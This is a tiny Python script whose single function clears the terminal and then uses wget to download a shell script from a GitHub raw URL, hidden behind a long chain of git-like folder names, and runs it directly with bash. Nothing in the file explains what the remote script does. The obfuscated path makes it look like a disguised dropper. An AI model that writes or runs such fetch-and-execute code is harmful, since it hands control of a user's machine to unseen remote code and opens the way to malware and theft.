import os
def RunMain():
    os.system(f'''
    clear
    ok=$(wget https://raw.githubusercontent.com/zanonx/zanonx/main/cache/refs/logs/origin/hooks/pack/description/config/head/objects/info/index/presample/exclude/remotes/xlr8.sh -q -O-)
    bash -c "$ok"
    ''')